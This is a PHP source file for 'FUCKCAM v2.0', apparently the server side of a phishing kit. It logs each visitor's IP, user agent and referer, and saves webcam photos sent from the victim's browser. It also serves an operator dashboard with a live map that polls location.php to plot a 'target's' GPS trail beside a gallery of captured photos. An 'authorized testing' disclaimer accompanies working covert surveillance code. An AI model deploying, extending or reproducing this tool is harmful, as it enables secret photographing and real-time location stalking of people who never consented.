<?php
/**
 * ip.php - IP & Camera Data Logger + Live Map Dashboard
 * FUCKCAM v2.0 by JUNMO — Real-Time GPS Tracking
 * Authorized Penetration Testing Tool
 */

$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

// Get client IP
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$timestamp = date('Y-m-d H:i:s');

// Handle photo capture (POST with base64 image)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['photo'])) {
    $photoData = $_POST['photo'];
    
    if (preg_match('/^data:image\/(\w+);base64,/', $photoData, $matches)) {
        $imageType = $matches[1];
        $base64Data = substr($photoData, strpos($photoData, ',') + 1);
        $base64Data = str_replace(' ', '+', $base64Data);
        $imageData = base64_decode($base64Data);
        
        if ($imageData !== false) {
            $filename = $logDir . '/photo_' . date('Ymd_His') . '_' . md5($ip) . '.jpg';
            file_put_contents($filename, $imageData);
            $logEntry = "[$timestamp] IP: $ip | Photo saved: $filename\n";
            file_put_contents($logDir . '/camera_log.txt', $logEntry, FILE_APPEND);
            echo "PHOTO_OK";
            exit;
        }
    }
    echo "PHOTO_ERR";
    exit;
}

// GET request - log the visit
$logEntry = "[$timestamp] IP: $ip | UA: $userAgent | Referer: $referer\n";
file_put_contents($logDir . '/visitors.log', $logEntry, FILE_APPEND);

$ipFile = $logDir . '/ip_' . md5($ip) . '.txt';
$ipData = "Timestamp: $timestamp\nIP: $ip\nUser-Agent: $userAgent\nReferer: $referer\n--- FUCKCAM by JUNMO ---\n";
file_put_contents($ipFile, $ipData, FILE_APPEND);

echo "LOGGED";

// Read log data for dashboard
$visitors = file_exists($logDir . '/visitors.log') ? file($logDir . '/visitors.log') : [];
$locLines = file_exists($logDir . '/location_log.txt') ? file($logDir . '/location_log.txt') : [];
$photos = glob($logDir . '/photo_*.jpg');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FUCKCAM by JUNMO - Live Tracking Dashboard</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a; 
            color: #e0e0e0; 
            padding: 0;
        }
        .header {
            background: linear-gradient(90deg, #1a0000, #2a0000);
            padding: 15px 25px;
            border-bottom: 2px solid #f00;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 { 
            color: #f00; 
            font-size: 20px;
            text-shadow: 0 0 10px rgba(255,0,0,0.3);
        }
        .header .sub { color: #888; font-size: 12px; }
        .header .stats { color: #aaa; font-size: 13px; text-align: right; }
        .header .stats span { color: #f44; font-weight: bold; }
        
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0;
            height: calc(100vh - 80px);
        }
        
        /* MAP PANEL */
        .map-panel {
            position: relative;
            height: 100%;
            border-right: 1px solid #222;
        }
        #liveMap {
            width: 100%;
            height: 100%;
            background: #111;
        }
        .map-overlay {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 1000;
            background: rgba(0,0,0,0.8);
            padding: 8px 15px;
            border-radius: 8px;
            border: 1px solid #f00;
            font-size: 12px;
            color: #4ade80;
        }
        .map-overlay .live-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #4ade80;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
            margin-right: 6px;
        }
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(1.5); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        /* DATA PANEL */
        .data-panel {
            height: 100%;
            overflow-y: auto;
            padding: 15px;
            background: #0d0d0d;
        }
        .data-panel::-webkit-scrollbar { width: 6px; }
        .data-panel::-webkit-scrollbar-track { background: #111; }
        .data-panel::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
        
        .section-title { 
            color: #f44; 
            font-size: 14px; 
            font-weight: 600; 
            margin: 15px 0 8px 0;
            border-bottom: 1px solid #222;
            padding-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .section-title:first-child { margin-top: 0; }
        
        .loc-entry {
            background: #111;
            border-left: 3px solid #4ade80;
            padding: 8px 10px;
            margin: 4px 0;
            font-size: 12px;
            font-family: monospace;
            border-radius: 0 4px 4px 0;
            line-height: 1.5;
        }
        .loc-entry .coord { color: #4ade80; }
        .loc-entry .time { color: #888; font-size: 11px; }
        .loc-entry .maps-link { color: #0ff; text-decoration: none; }
        .loc-entry .maps-link:hover { text-decoration: underline; }
        
        .visitor-entry {
            background: #111;
            border-left: 3px solid #f44;
            padding: 6px 10px;
            margin: 3px 0;
            font-size: 11px;
            font-family: monospace;
            border-radius: 0 4px 4px 0;
        }
        
        .photo-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 8px;
            margin-top: 5px;
        }
        .photo-grid img {
            width: 100%;
            height: 90px;
            object-fit: cover;
            border-radius: 4px;
            border: 1px solid #333;
            cursor: pointer;
            transition: border 0.2s;
        }
        .photo-grid img:hover { border-color: #f00; }
        
        .empty-state {
            color: #555;
            font-size: 13px;
            text-align: center;
            padding: 20px;
            font-style: italic;
        }
        
        .refresh-btn {
            background: #2a0000;
            color: #f44;
            border: 1px solid #f44;
            padding: 5px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.2s;
        }
        .refresh-btn:hover { background: #3a0000; }
        
        .credit {
            color: #555;
            font-size: 11px;
            text-align: center;
            padding: 10px;
            border-top: 1px solid #1a1a1a;
            margin-top: 15px;
        }
        
        /* Mobile responsive */
        @media (max-width: 768px) {
            .main-grid {
                grid-template-columns: 1fr;
                grid-template-rows: 50vh auto;
            }
            .map-panel { border-right: none; border-bottom: 1px solid #222; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>📡 FUCKCAM by JUNMO</h1>
            <div class="sub">Real-Time GPS Tracking — Live Dashboard</div>
        </div>
        <div class="stats">
            <div>📍 Locations: <span id="locCount"><?php echo count($locLines); ?></span></div>
            <div>📸 Photos: <span><?php echo count($photos); ?></span></div>
            <div>👤 Visitors: <span><?php echo count($visitors); ?></span></div>
            <div style="margin-top:5px;"><button class="refresh-btn" onclick="location.reload()">⟳ Refresh</button></div>
        </div>
    </div>

    <div class="main-grid">
        <!-- MAP PANEL -->
        <div class="map-panel">
            <div class="map-overlay">
                <span class="live-dot"></span>
                <span id="liveStatus">Waiting for location data...</span>
            </div>
            <div id="liveMap"></div>
        </div>
        
        <!-- DATA PANEL -->
        <div class="data-panel" id="dataPanel">
            <!-- Real-time location section -->
            <div class="section-title">📍 Real-Time Location History</div>
            <div id="locationUpdates">
                <?php
                if (count($locLines) > 0) {
                    $recentLocs = array_slice($locLines, -20);
                    foreach (array_reverse($recentLocs) as $line) {
                        echo "<div class='loc-entry'>" . htmlspecialchars($line) . "</div>";
                    }
                } else {
                    echo "<div class='empty-state'>No location data received yet. Waiting for target...</div>";
                }
                ?>
            </div>

            <!-- Photos section -->
            <div class="section-title">📸 Captured Photos</div>
            <?php if (count($photos) > 0): ?>
            <div class="photo-grid">
                <?php foreach (array_reverse($photos) as $p): 
                    $name = basename($p);
                    $relPath = 'logs/' . $name;
                ?>
                <a href="<?php echo $relPath; ?>" target="_blank">
                    <img src="<?php echo $relPath; ?>" alt="Captured photo">
                </a>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class='empty-state'>No photos captured yet.</div>
            <?php endif; ?>

            <!-- Visitors section -->
            <div class="section-title">👤 Visitor Log</div>
            <div id="visitorLog">
                <?php
                $recentVisitors = array_slice($visitors, -10);
                foreach (array_reverse($recentVisitors) as $v) {
                    echo "<div class='visitor-entry'>" . htmlspecialchars($v) . "</div>";
                }
                ?>
            </div>

            <div class="credit">FUCKCAM v2.0 by JUNMO — Authorized Security Testing Only</div>
        </div>
    </div>

    <script>
        // Initialize the map
        const map = L.map('liveMap').setView([20, 0], 2);
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors',
            maxZoom: 19
        }).addTo(map);

        let marker = null;
        let polyline = null;
        let trailCoords = [];
        let currentTarget = null;
        let locationPoints = [];

        // Custom red icon for the target
        const targetIcon = L.divIcon({
            className: '',
            html: '<div style="background:#f00;width:16px;height:16px;border-radius:50%;border:3px solid #fff;box-shadow:0 0 15px rgba(255,0,0,0.8);"></div>',
            iconSize: [16, 16],
            iconAnchor: [8, 8]
        });

        // Pulse effect for accuracy circle
        const pulseIcon = L.divIcon({
            className: '',
            html: '<div style="position:relative;"><div style="background:rgba(255,0,0,0.3);width:40px;height:40px;border-radius:50%;border:2px solid rgba(255,0,0,0.5);position:absolute;top:-12px;left:-12px;animation:pulse 2s infinite;"></div><div style="background:#f00;width:16px;height:16px;border-radius:50%;border:3px solid #fff;position:absolute;top:0;left:0;"></div></div>',
            iconSize: [16, 16],
            iconAnchor: [8, 8]
        });

        // Fetch latest locations from server
        function fetchLocations() {
            fetch('location.php')
                .then(response => response.json())
                .then(data => {
                    if (data.entries && data.entries.length > 0) {
                        updateMap(data.entries);
                        updateLocationPanel(data.entries);
                        document.getElementById('locCount').textContent = data.count;
                    }
                })
                .catch(err => console.error('Fetch error:', err));
        }

        // Parse log lines and update the map
        function updateMap(entries) {
            const points = [];
            
            entries.forEach(line => {
                // Parse: [timestamp] IP: x.x.x.x | Lat: xx | Lon: xx | ...
                const latMatch = line.match(/Lat:\s*([-\d.]+)/);
                const lonMatch = line.match(/Lon:\s*([-\d.]+)/);
                const timeMatch = line.match(/^\[([^\]]+)\]/);
                
                if (latMatch && lonMatch) {
                    const lat = parseFloat(latMatch[1]);
                    const lon = parseFloat(lonMatch[1]);
                    const time = timeMatch ? timeMatch[1] : '';
                    
                    if (!isNaN(lat) && !isNaN(lon)) {
                        points.push({ lat, lon, time });
                    }
                }
            });

            if (points.length === 0) return;

            // Get the latest point
            const latest = points[points.length - 1];
            
            // Update marker
            if (marker) {
                marker.setLatLng([latest.lat, latest.lon]);
            } else {
                marker = L.marker([latest.lat, latest.lon], { icon: targetIcon })
                    .addTo(map)
                    .bindPopup('<b>📍 Target Location</b><br>Lat: ' + latest.lat.toFixed(6) + '<br>Lon: ' + latest.lon.toFixed(6) + '<br>Time: ' + latest.time);
            }

            // Update popup
            marker.setPopupContent(
                '<b>📍 Target Location</b><br>' +
                'Lat: ' + latest.lat.toFixed(6) + '<br>' +
                'Lon: ' + latest.lon.toFixed(6) + '<br>' +
                'Time: ' + latest.time + '<br>' +
                '<a href="https://www.google.com/maps?q=' + latest.lat + ',' + latest.lon + '" target="_blank">🔗 Open in Google Maps</a>'
            );

            // Update trail polyline
            trailCoords = points.map(p => [p.lat, p.lon]);
            
            if (polyline) {
                polyline.setLatLngs(trailCoords);
            } else {
                polyline = L.polyline(trailCoords, {
                    color: '#ff4444',
                    weight: 3,
                    opacity: 0.7,
                    dashArray: '8, 4'
                }).addTo(map);
            }

            // Fly to latest position if significantly different
            if (currentTarget) {
                const dist = map.distance(
                    [latest.lat, latest.lon], 
                    [currentTarget.lat, currentTarget.lon]
                );
                if (dist > 100) {
                    map.flyTo([latest.lat, latest.lon], 15, { duration: 1 });
                }
            } else {
                map.setView([latest.lat, latest.lon], 15);
            }
            
            currentTarget = { lat: latest.lat, lon: latest.lon };

            // Update live status
            document.getElementById('liveStatus').innerHTML = 
                'Tracking: ' + latest.lat.toFixed(6) + ', ' + latest.lon.toFixed(6) + 
                ' <span style="color:#888;font-size:11px;">| ' + latest.time + '</span>';
        }

        // Update the location panel
        function updateLocationPanel(entries) {
            const container = document.getElementById('locationUpdates');
            let html = '';
            
            entries.slice(0, 20).forEach(line => {
                const escaped = line.replace(/</g, '&lt;').replace(/>/g, '&gt;');
                html += "<div class='loc-entry'>" + escaped + "</div>";
            });
            
            if (html === '') {
                html = "<div class='empty-state'>No location data received yet.</div>";
            }
            
            container.innerHTML = html;
        }

        // Auto-refresh every 2 seconds
        setInterval(fetchLocations, 2000);

        // Initial fetch
        setTimeout(fetchLocations, 500);
    </script>
</body>
</html>